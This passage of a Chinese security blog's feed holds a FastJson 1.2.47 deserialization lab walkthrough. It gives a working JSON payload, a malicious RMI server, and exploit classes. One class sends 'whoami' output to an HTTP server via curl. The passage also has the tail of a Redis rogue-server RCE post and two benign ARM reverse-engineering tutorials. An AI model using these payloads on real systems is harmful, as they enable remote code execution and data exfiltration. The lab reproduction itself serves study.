alt="1563023912222"></p><p>下载脚本：<a href="https://github.com/Dliv3/redis-rogue-server。启动执行脚本" target="_blank" rel="noopener">https://github.com/Dliv3/redis-rogue-server。启动执行脚本</a></p><p>脚本执行完后显示：</p><p><img src="\2019\07\Redis-主从复制\1563025997123.png" alt="1563025997123"></p><p>同时可以看到redis日志中加载了so文件：</p><p><img src="\2019\07\Redis-主从复制\1563026034882.png" alt="1563026034882"></p><p>连接redis执行命令：</p><p><img src="\2019\07\Redis-主从复制\1563026095498.png" alt="1563026095498"></p><p>所以在未授权访问和弱密码登陆的情况下此问题才可以利用。</p><p>原文章：<a href="https://paper.seebug.org/975/" target="_blank" rel="noopener">https://paper.seebug.org/975/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Redis主从复制&quot;&gt;&lt;a href=&quot;#Redis主从复制&quot; class=&quot;headerlink&quot; title=&quot;Redis主从复制&quot;&gt;&lt;/a&gt;Redis主从复制&lt;/h3&gt;&lt;p&gt;redis主从复制，前几天分享的新版redis未授权利用的新型方式。&lt;/p&gt;
&lt;p&gt;
      
    
    </summary>
    
    
      <category term="web安全" scheme="/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>FastJson 反序列化</title>
    <link href="/2019/07/FastJson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>/2019/07/FastJson-反序列化/</id>
    <published>2019-07-15T02:16:07.000Z</published>
    <updated>2019-07-15T02:35:30.420Z</updated>
    
    <content type="html"><![CDATA[<h3 id="FastJson-反序列化"><a href="#FastJson-反序列化" class="headerlink" title="FastJson 反序列化"></a>FastJson 反序列化</h3><p>前一段时间HW护出来一个FastJson的RCE。网上遍布了利用的poc。此处简单模拟一下触发流程。</p><p>先下载1.2.47的FastJson，地址：<a href="http://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.47/FastJson-1.2.47.jar" target="_blank" rel="noopener">http://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.47/FastJson-1.2.47.jar</a></p><p>利用的JDK为，java_8u60。地址：<a href="https://download.oracle.com/otn/java/jdk/8u60-b27/jdk-8u60-windows-x64.exe" target="_blank" rel="noopener">https://download.oracle.com/otn/java/jdk/8u60-b27/jdk-8u60-windows-x64.exe</a></p><p>使用的IDE为IDEA，下载FastJson后导入IDEA。</p><p>从File - Project Structure - Modules - Dependencies导入</p><p>创建poc为如下：</p><pre><code>import com.alibaba.fastjson.JSON;public class poc {    public static void main(String[] argv) {        String payload = &quot;{\&quot;name\&quot;:{\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;},&quot; +                &quot;\&quot;xxxx\&quot;:{\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:&quot; +                &quot;\&quot;rmi://localhost:1099/Exploit\&quot;,\&quot;autoCommit\&quot;:true}}}&quot;;        JSON.parse(payload);    }}</code></pre><p><img src="\2019\07\FastJson-反序列化\1563011101595.png" alt="1563011101595"></p><p>创建一个RMI服务器。可以利用如下的JAVA代码。</p><pre><code>import com.sun.jndi.rmi.registry.ReferenceWrapper;import javax.naming.Reference;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;public class rmiServer {    public static void main(String[] args) throws Exception {        Registry registry = LocateRegistry.createRegistry(1099);        Reference reference = new Reference(&quot;Exloit&quot;,                &quot;Exploit&quot;,&quot;http://localhost:8000/&quot;);        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);        registry.bind(&quot;Exploit&quot;,referenceWrapper);    }}</code></pre><p>或者采用mar创建一个RMI服务器。</p><pre><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://localhost:8000/#Exploit</code></pre><p>再开启一个HTTP服务，下面写入一个恶意class文件。</p><pre><code>import javax.naming.Context;import javax.naming.Name;import javax.naming.spi.ObjectFactory;import java.io.IOException;import java.util.Hashtable;public class Exploit implements ObjectFactory {    @Override    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment) {        exec(&quot;xterm&quot;);        return null;    }    public static String exec(String cmd) {        try {            Runtime.getRuntime().exec(&quot;calc&quot;);        } catch (IOException e) {            e.printStackTrace();        }        return &quot;&quot;;    }    public static void main(String[] args) {        exec(&quot;123&quot;);    }}</code></pre><p>此处利用mar创建的RMI服务器来验证：</p><p><img src="\2019\07\FastJson-反序列化\1563012977594.png" alt="1563012977594"></p><p>查看HTTP服务，可以看到请求的恶意class请求。</p><p><img src="\2019\07\FastJson-反序列化\1563013067020.png" alt="1563013067020"></p><p>如果请求了RMI服务后一直卡在没有请求HTTP服务的话，可以查看一下防火墙设置。我就不说卡在这里多久了。23333</p><p>当然如果也可以使用之前老RCE的恶意class文件</p><pre><code>import java.io.BufferedInputStream;import java.io.BufferedReader;import java.io.InputStreamReader;public class exploit2 {    public static String exec(String cmd) throws Exception {        String sb = &quot;&quot;;        BufferedInputStream in = new BufferedInputStream(Runtime.getRuntime().exec(cmd).getInputStream());        BufferedReader inBr = new BufferedReader(new InputStreamReader(in));        String lineStr;        while ((lineStr = inBr.readLine()) != null)            sb += lineStr + &quot;\n&quot;;        inBr.close();        in.close();        return sb;    }    public exploit2() throws Exception {        String result = &quot;&quot;;        result = exec(&quot;whoami&quot;);        String cmd=&quot;curl http://localhost:8000/&quot;+result;        throw new Exception(exec(cmd));    }    public static void main(String[] args) throws Exception {        String result = &quot;&quot;;        result = exec(&quot;whoami&quot;);        String cmd=&quot;curl http://localhost:8000/&quot;+result;        throw new Exception(exec(cmd));    }}</code></pre><p>执行后，查看携带响应的请求</p><p><img src="\2019\07\FastJson-反序列化\1563013609323.png" alt="1563013609323"></p><p>内容部分POC来源：<a href="https://www.03sec.com/3240.shtml" target="_blank" rel="noopener">https://www.03sec.com/3240.shtml</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;FastJson-反序列化&quot;&gt;&lt;a href=&quot;#FastJson-反序列化&quot; class=&quot;headerlink&quot; title=&quot;FastJson 反序列化&quot;&gt;&lt;/a&gt;FastJson 反序列化&lt;/h3&gt;&lt;p&gt;前一段时间HW护出来一个FastJson的RCE。网
      
    
    </summary>
    
    
      <category term="web安全" scheme="/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>逆向函数分析引用</title>
    <link href="/2019/07/%E9%80%86%E5%90%91%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90%E5%BC%95%E7%94%A8/"/>
    <id>/2019/07/逆向函数分析引用/</id>
    <published>2019-07-09T08:56:32.000Z</published>
    <updated>2019-07-26T09:56:38.114Z</updated>
    
    <content type="html"><![CDATA[<p>代码编译，使用代码如下:</p><pre><code>#include &lt;stdio.h&gt;#include &lt;string.h&gt;int fun1(){    int a;    int b;    b=10;    a=b++;    return a;}int fun2(int a,int b){    return a+b+fun1();}int fun3(int a,int b,int c,int d,int e,int f,int g,int h){    if(a+b+c &lt; d+e+f){        return a+b+c+fun2(a,f);    }else if(a+b+c &gt; d+e+f){        return a+b+c+fun2(b,e);    }else{        return 0;    }}int main(){    int tmp;    printf(&quot;%d&quot;,fun3(1,2,3,4,5,6,7,8));    return 0;}</code></pre><p>makefile文件同之前的基本一致</p><pre><code>#设置目录NDK_ROOT=D:\Androidstudio-sdk\android-ndk-r14bTOOLCHAINS_ROOT=$(NDK_ROOT)\toolchains\arm-linux-androideabi-4.9\prebuilt\windows-x86_64TOOLCHAINS_PREFIX=$(TOOLCHAINS_ROOT)\bin\arm-linux-androideabiTOOLCHAINS_INCLUDE=$(TOOLCHAINS_ROOT)\lib\gcc\arm-linux-androideabi\4.9.x\include-fixedPLATFORM_ROOT=$(NDK_ROOT)\platforms\android-14\arch-armPLATFORM_INCLUDE=$(PLATFORM_ROOT)\usr\includePLATFORM_LIB=$(PLATFORM_ROOT)\usr\libMODULE_NAME=app6BUILD_TYPE=cPATH_ANDROID=/data/local/tmp/RM=delFLAGS=-I$(TOOLCHAINS_INCLUDE) \    -I$(PLATFORM_INCLUDE) \    -L$(PLATFORM_LIB) \    -nostdlib \    -lgcc \    -Bdynamic \    -lc    \    -O0OBJS=$(MODULE_NAME).o \    $(PLATFORM_LIB)\crtbegin_dynamic.o \    $(PLATFORM_LIB)\crtend_android.oall:    $(TOOLCHAINS_PREFIX)-gcc $(FLAGS) -c $(MODULE_NAME).$(BUILD_TYPE) -o $(MODULE_NAME).o -pie -fPIE    $(TOOLCHAINS_PREFIX)-gcc $(FLAGS) -S $(MODULE_NAME).$(BUILD_TYPE) -o $(MODULE_NAME).S -pie -fPIE    $(TOOLCHAINS_PREFIX)-gcc $(FLAGS) $(OBJS) -o $(MODULE_NAME) -pie -fPIEclean:    $(RM) *.oinstall:    adb push $(MODULE_NAME) $(PATH_ANDROID)    adb shell chmod 755 $(PATH_ANDROID)$(MODULE_NAME)    adb shell $(PATH_ANDROID)$(MODULE_NAME)</code></pre><p>编译后如下，会生成一个无后缀的可执行文件。丢到IDA中。点击main函数，如下：</p><p><img src="\2019\07\逆向函数分析引用\1562658661016.png" alt="1562658661016"></p><p>其中已经简单分析函数参数的引用，开头可以看到，参数[sp]，意思是第五个参数引用，若后面还有其他参数则以四个字节为参数引用存储。关于寄存器的含义</p><pre><code>r0-r3    用作传入函数参数，传出函数返回值。在子程序调用之间，可以将 r0-r3 用于任何用途。r4-r11   被用来存放函数的局部变量。如果被调用函数使用了这些寄存器，它在返回之前必须恢复这些寄存器的值。r12      是内部调用暂时寄存器 ip。它在过程链接胶合代码（例如，交互操作胶合代码）中用于此角色。r13      是栈指针 sp。它不能用于任何其它用途。sp 中存放的值在退出被调用函数时必须与进入时的值相同。r14      是链接寄存器 lr。如果您保存了返回地址，则可以在调用之间将 r14 用于其它用途，程序返回时要恢复r15      是程序计数器 PC。它不能用于任何其它用途。</code></pre><p>详细介绍参考：<a href="https://www.veryarm.com/36274.html" target="_blank" rel="noopener">https://www.veryarm.com/36274.html</a></p><p>到BL指令，BL指令是有返回的跳转，表示子程序的返回通过LR寄存器保存，保存的地址值就是下一条指令的地址值。如下的fun3函数中，对于多参数并没有使用栈来保存，而是使用R0-R3寄存器来循环的调用。</p><p><img src="\2019\07\逆向函数分析引用\1562659401125.png" alt="1562659401125"></p><p>判断结束后进入不同的分支，走到如图中的两部分分支的时候出现了一个新的子程序调用，fun2。</p><p><img src="\2019\07\逆向函数分析引用\1562659598100.png" alt="1562659598100"></p><p>点击fun2，其中又调用了fun1函数，同样点击fun1。</p><p><img src="\2019\07\逆向函数分析引用\1562659844246.png" alt="1562659844246"></p><p>通过fun1就可以看到函数的具体操作行为，其中最后返回值BX，带状态切换返回，其中的LR则为fun2的函数MOV的地址值，返回到fun2中继续执行。</p><p><img src="\2019\07\逆向函数分析引用\1562659872641.png" alt="1562659872641"></p><p>而fun2中的最后代码也对应了开头的两个汇编语句，恢复sp指令值，将栈内容恢复到寄存器中。获取到参数值后，回到MOV指令中其中注释的fun1和fun2代表当前分支的输入参数。最后都执行到loc_4B8，结果保存到R0中返回，最后也是恢复sp和寄存器。</p><p><img src="\2019\07\逆向函数分析引用\1562662004752.png" alt="1562662004752"></p><p>这时候再看main函数最后执行，获取的fun3返回赋值给R2，至于LDR和ADD，代表了读取unk_5C8标记处的参数字段，点击则可以看到是“%d”，也就是R3代表“%d”,R1代表参数返回值。由printf来输出。最后返回0。结束函数执行。</p><p><img src="\2019\07\逆向函数分析引用\1562662154590.png" alt="1562662154590"></p><p>此汇编分析主要是函数调用和返回之间的联系，希望也可以为后面的读取APP so文件打下基础把。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;代码编译，使用代码如下:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
int fun1()
{
    int a;
    int b;
    b=10;
    a=b++;
  
      
    
    </summary>
    
    
      <category term="Android逆向" scheme="/tags/Android%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>ARM原生循环语句逆向分析</title>
    <link href="/2019/07/ARM%E5%8E%9F%E7%94%9F%E5%BE%AA%E7%8E%AF%E8%AF%AD%E5%8F%A5%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/"/>
    <id>/2019/07/ARM原生循环语句逆向分析/</id>
    <published>2019-07-03T07:09:57.000Z</published>
    <updated>2019-07-26T09:56:09.610Z</updated>
    
    <content type="html"><![CDATA[<h4 id="代码编译"><a href="#代码编译" class="headerlink" title="代码编译"></a>代码编译</h4><p>使用的代码为非虫的Android软件安全权威指南，app6.c</p><p>代码如下：</p><pre><code>#include &lt;stdio.h&gt;int nums[5] = {1, 2, 3, 4, 5};int for1(int n) {    int i = 0;    int s = 0;    for (i = 0; i &lt; n; i++) {        s += i * 2;    }    return s;}int for2(int n) {    int i = 0;    int s = 0;    for (i = 0; i &lt; n; i++) {        s += i * i + nums[n - 1];    }    return s;}int dowhile(int n) {    int i = 1;    int s = 0;    do {        s += i;    } while (i++ &lt; n);    return s;}int whiledo(int n) {    int i = 1;    int s = 0;    while (i &lt;= n) {        s += i++;    }    return s;}void if1(int n) {    if (n &lt; 10) {        printf(&quot;the number less than 10\n&quot;);    } else {        printf(&quot;the number greater than or equal to 10\n&quot;);    }}void if2(int n) {    if (n &lt; 16) {        printf(&quot;he is a boy\n&quot;);    } else if (n &lt; 30) {        printf(&quot;he is a young man\n&quot;);    } else if (n &lt; 45) {        printf(&quot;he is a strong man\n&quot;);    } else {        printf(&quot;he is an old man\n&quot;);    }}int main(int argc, char *argv[]) {    printf(&quot;for1:%d\n&quot;, for1(5));    printf(&quot;for2:%d\n&quot;, for2(5));    printf(&quot;dowhile:%d\n&quot;, dowhile(100));    printf(&quot;while:%d\n&quot;, whiledo(100));    if1(5);    if2(35);    return 0;}</code></pre><p>删除了其中的switch函数，编译的时候函数一直报错，使用make编译，创建jni目录，把c文件和Makefile放入到目录中，修改文件为如下：</p><pre><code>#设置目录NDK_ROOT=D:\Androidstudio-sdk\android-ndk-r14bTOOLCHAINS_ROOT=$(NDK_ROOT)\toolchains\arm-linux-androideabi-4.9\prebuilt\windows-x86_64TOOLCHAINS_PREFIX=$(TOOLCHAINS_ROOT)\bin\arm-linux-androideabiTOOLCHAINS_INCLUDE=$(TOOLCHAINS_ROOT)\lib\gcc\arm-linux-androideabi\4.9.x\include-fixedPLATFORM_ROOT=$(NDK_ROOT)\platforms\android-14\arch-armPLATFORM_INCLUDE=$(PLATFORM_ROOT)\usr\includePLATFORM_LIB=$(PLATFORM_ROOT)\usr\libMODULE_NAME=app6BUILD_TYPE=cPATH_ANDROID=/data/local/tmp/RM=delFLAGS=-I$(TOOLCHAINS_INCLUDE) \    -I$(PLATFORM_INCLUDE) \    -L$(PLATFORM_LIB) \    -nostdlib \    -lgcc \    -Bdynamic \    -lc    \    -O0OBJS=$(MODULE_NAME).o \    $(PLATFORM_LIB)\crtbegin_dynamic.o \    $(PLATFORM_LIB)\crtend_android.oall:    $(TOOLCHAINS_PREFIX)-gcc $(FLAGS) -c $(MODULE_NAME).$(BUILD_TYPE) -o $(MODULE_NAME).o -pie -fPIE    $(TOOLCHAINS_PREFIX)-gcc $(FLAGS) -S $(MODULE_NAME).$(BUILD_TYPE) -o $(MODULE_NAME).S -pie -fPIE    $(TOOLCHAINS_PREFIX)-gcc $(FLAGS) $(OBJS) -o $(MODULE_NAME) -pie -fPIEclean:    $(RM) *.oinstall:    adb push $(MODULE_NAME) $(PATH_ANDROID)    adb shell chmod 755 $(PATH_ANDROID)$(MODULE_NAME)    adb shell $(PATH_ANDROID)$(MODULE_NAME)</code></pre><p>编译后如下，会生成一个无后缀的可执行文件。丢到IDA中。点击for1函数，空格切换图形视图。一般看到这种形式的箭头指向的时候基本就是for或者while语句。</p><p><img src="\2019\07\ARM原生循环语句逆向分析\1561960721772.png" alt="1561960721772"></p><h4 id="1-for1函数"><a href="#1-for1函数" class="headerlink" title="1. for1函数"></a>1. for1函数</h4><p>查看第一个汇编指令块，创建了三个函数，开头先做了保存子程序现场，开启堆栈空间。R0-R3，是用作传入变量寄存器，所以此处有三个变量，分别为，var_10, var_8, var_c。最后强制跳转到loc_3e8标记处。</p><p><img src="\2019\07\ARM原生循环语句逆向分析\1561962684226.png" alt="1561962684226"></p><p>loc_3e8处的汇编代码块，从存储器中加载两个变量值到R2，R3然后对比两个变量，如果R2小于R3，则跳转到loc_3c8标记处。其中对var_8做了一次逻辑左移处理，相当于R3 = R3 * 2^1。再获取变量var_c，执行操作R3 = R3 +R2，再存储到存储器中。下面就相当于for循环中的循环变量自加。最后循环跳出后，再把var_c的值返回。</p><p><img src="\2019\07\ARM原生循环语句逆向分析\1561964069808.png" alt="1561964069808"></p><p>按照以上逻辑写一段C代码，如下：</p><pre><code>int for1(int var_10){    int var_8 = 0;    int var_c = 0;    for(var_8 = 0; var_8 &lt; var_10; var_8++){        var_c = var_c + var_8 &lt;&lt; 1;    }    return var_c;}</code></pre><h4 id="2-for2函数"><a href="#2-for2函数" class="headerlink" title="2. for2函数"></a>2. for2函数</h4><p>for2跟如上的for1基本类似，就是内部处理处有点不一样，其中nums，点击一下就可以看到是五位的数组，具体是，先var_8自乘，然后读取nums数组，R3为nums数组的地址值，也就是nums[var_10 -1]，再加var_8的自乘和var_c。</p><p><img src="\2019\07\ARM原生循环语句逆向分析\1562135688840.png" alt="1562135688840"></p><p>C代码：</p><pre><code>int nums[5] = {1,2,3,4,5};int for2(int var_10){    int var_8 = 0;    int var_c = 0;    for(var_8 = 0; var_8 &lt; var_10; var_8++){        var_c =var_c + var_8* var_8  + nums[var_10 - 1];    }    return var_c;}</code></pre><h4 id="3-dowhile函数"><a href="#3-dowhile函数" class="headerlink" title="3. dowhile函数"></a>3. dowhile函数</h4><p>其中大部分都类似以上汇编代码，其中dowhile和whiledo存在有明显不同，dowhile是先执行内部的汇编代码，变量执行自加等操作，最后在判断是否一致，循环体上大致类似如下图，而whiledo更类似于如上的for循环体。汇编中并没有强制跳转，而且跳转标记在判断跳转处的上方。</p><p><img src="\2019\07\ARM原生循环语句逆向分析\1561972796048.png" alt="1561972796048"></p><p>根据汇编代码写出大致的C代码。</p><pre><code>int dowhile(int var_10){    int var_8 = 1;    int var_c = 0;    do{        var_c = var_8 + var_c;        var_8 = var_8 + 1;    }while(var_8 &lt; var_10)    return var_c}</code></pre><h4 id="4-whiledo函数"><a href="#4-whiledo函数" class="headerlink" title="4. whiledo函数"></a>4. whiledo函数</h4><p>whiledo从结构体上和for1相同，本来这两种循环就及其类似，主要查看的时候能分清while循环的特点和逻辑来区分，哪个参数为判断参数，哪个参数为计算参数。在B指令执行的地方，就为for和while的判断指令。</p><p><img src="\2019\07\ARM原生循环语句逆向分析\1562122434389.png" alt="1562122434389"></p><p>根据汇编代码写出大致的C代码。</p><pre><code>int whiledo(int var_10){    int var_8 = 1;    int var_c = 0;    while(var_8 &lt;= var_10){        var_8 = var_8 + 1;        var_c = var_c + var_8;    }    return var_c}</code></pre><h4 id="5-if1-函数"><a href="#5-if1-函数" class="headerlink" title="5. if1 函数"></a>5. if1 函数</h4><p>如下，具有单分支的if结构体可以看出是if-else判断形式</p><p><img src="\2019\07\ARM原生循环语句逆向分析\1562123715096.png" alt="1562123715096"></p><p>按照汇编意思，C代码如下：</p><pre><code>void if1(int var_8){    if(var_8 &gt; 9){        puts(&quot;the number greater than or equal to 10&quot;);    }else{        puts(&quot;the number less than 10&quot;);    }}</code></pre><p>在if判断中，判断体在汇编中和原代码是相反的，意思是var_8 &gt; 9原文应该是var_8 &lt;=9 。printf也由puts来改变输出，puts输出会自动添加换行符，也就不在需要原文中的\n。</p><pre><code>void if1(int var_8){    if(var_8 &lt;= 9){        puts(&quot;the number less than 10&quot;);    }else{        puts(&quot;the number greater than or equal to 10&quot;);    }}</code></pre><h4 id="6-if2函数"><a href="#6-if2函数" class="headerlink" title="6. if2函数"></a>6. if2函数</h4><p>多判断结构体，也就是if-else-if</p><p><img src="\2019\07\ARM原生循环语句逆向分析\1562125307657.png" alt="1562125307657"></p><p>其中可以看到有多个LDR计算赋值指令，此处的LDR和MOV类似，只是有些时候MOV不适合使用，所以用LDR来赋值计算。</p><pre><code>LDR     R3, =(aHeIsABoy - 0x5D0)</code></pre><p>代表意思就是，aHeIsABoy的地址值减去0x5D0，赋值给R3。仔细看一下就可以明白，其中的参数都是原字符串。LDR就是aHeIsABoy减去0x5D0，此处是07EC减去0x5D0，为021C。而PC，程序计数器，指的是BL的地址值。详细参考：<a href="https://www.cnblogs.com/ichunqiu/p/9056630.html" target="_blank" rel="noopener">https://www.cnblogs.com/ichunqiu/p/9056630.html</a></p><p>也就是说，执行到ADD的时候，MOV在译码阶段，BL在取址阶段。PC寄存器总是指向随后的第三条指令。</p><p>用BL的地址值加上R3，05D0加上021C为7EC，也就是aHeIsABoy的地址值，当然IDA已经识别出来并注释到其后。再把字符串由puts输出。</p><pre><code>LDR     R3, =(aHeIsABoy - 0x5D0)     //000007EC aHeIsABoy       DCB &quot;he is a boy&quot;,0ADD     R3, PC, R3      ; &quot;he is a boy&quot;MOV     R0, R3          ; sBL      putsB       loc_628</code></pre><p>按照汇编意思，C代码如下：</p><pre><code>void if2(int var_8){    if(var_8 &gt; 15){        if(var_8 &gt; 29){            if(var_8 &gt; 44){                puts(&quot;he is an old man&quot;);            }            else{                puts(&quot;he is a strong man&quot;);            }        }        else{            puts(&quot;he is a young man&quot;);        }    }    else{        puts(&quot;he is a boy&quot;);    }}</code></pre><p>由于汇编对判断的形式，用else if的形式可以这么写</p><pre><code>void if2(int var_8){    if(var_8 &lt;= 15){        puts(&quot;he is a boy&quot;);    }    else if(var_8 &lt;= 29){        puts(&quot;he is a young man&quot;);    }    else if(var_8 &lt;= 44){        puts(&quot;he is a strong man&quot;);    }    else{        puts(&quot;he is an old man&quot;);    }}</code></pre><p>看完以上的汇编分析后，可以得到循环体的特点，循环体一般为以下：</p><pre><code>....    //汇编代码B loc_xxx....CMP r1, r2BXX loc_xxx....BX LR</code></pre><p>判断形式一般为以下：</p><pre><code>    ....    CMP R1, R2    BXX loc_xxx    ....loc_xxx    ....    B   loc_zzzloc_zzz    ....</code></pre><p>当然，以上CMP后并不一定会跟随B指令，也会由其他条件执行指令，例如：</p><pre><code>CMP R2, R3ADDEQ R2, R3, #1</code></pre><p>其中寄存器存值，仍然是需要注意点，不小心会看错赋值，如下：</p><pre><code>LDR     R3, [R11,#var_8]LDR     R2, [R11,#var_C] ADD     R3, R2, R3      </code></pre><p>在执行一些类似ADD的指令操作后，其中的R3已不在代表var_8，其中的结果跟ADD后所获取到的R3赋值有关，这种情况可以看成：</p><pre><code>a = 1;b = 2;a = a + b;  //3</code></pre><p>所以，其中a的值已不在是1，同样如上中，R3也为此，在初期可能在不能连续查看汇编代码的情况下，会犯这种失误。</p><h4 id="main-函数"><a href="#main-函数" class="headerlink" title="main 函数"></a>main 函数</h4><p>main函数中的赋值和返回值寄存器对应之前函数中的返回和赋值，如MOV R0, #5。在for1中，R0赋值给var_10。</p><p>同时返回值在R0中。</p><p><img src="\2019\07\ARM原生循环语句逆向分析\1562137477746.png" alt="1562137477746"></p><p>下部汇编类似，就不在一步步看啦。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;代码编译&quot;&gt;&lt;a href=&quot;#代码编译&quot; class=&quot;headerlink&quot; title=&quot;代码编译&quot;&gt;&lt;/a&gt;代码编译&lt;/h4&gt;&lt;p&gt;使用的代码为非虫的Android软件安全权威指南，app6.c&lt;/p&gt;
&lt;p&gt;代码如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#i
      
    
    </summary>
    
    
      <category term="Android逆向" scheme="/tags/Android%E9%80%86%E5%90%91/"/>
    
  </entry>
  
</feed>
